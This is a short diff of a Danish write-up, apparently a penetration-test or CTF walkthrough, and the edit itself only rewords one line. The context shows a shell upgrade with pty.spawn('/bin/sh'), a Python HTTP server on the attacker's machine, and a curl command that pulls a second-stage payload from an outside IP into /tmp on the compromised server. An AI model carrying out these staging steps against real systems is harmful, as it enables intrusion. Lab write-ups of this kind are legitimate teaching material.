@@ -310,10 +310,12 @@ pty.spawn("/bin/sh")
 Vi kan derefter gemme dette i en fil på vores host og starte en simple http server via. python fra den samme folder:
 
 På din maskine:
+
 ```python3 -m http.server```
 
 På server via. pseudo shell:
-Nu kan vi bruge vores pseudo shell og curl til at hente payloaden på serveren:
+
+Vi kan derefter hente vores payload.
 
 ```curl http://77.210.13.4:8000/stage2.py -o /tmp/stage2.py```
 
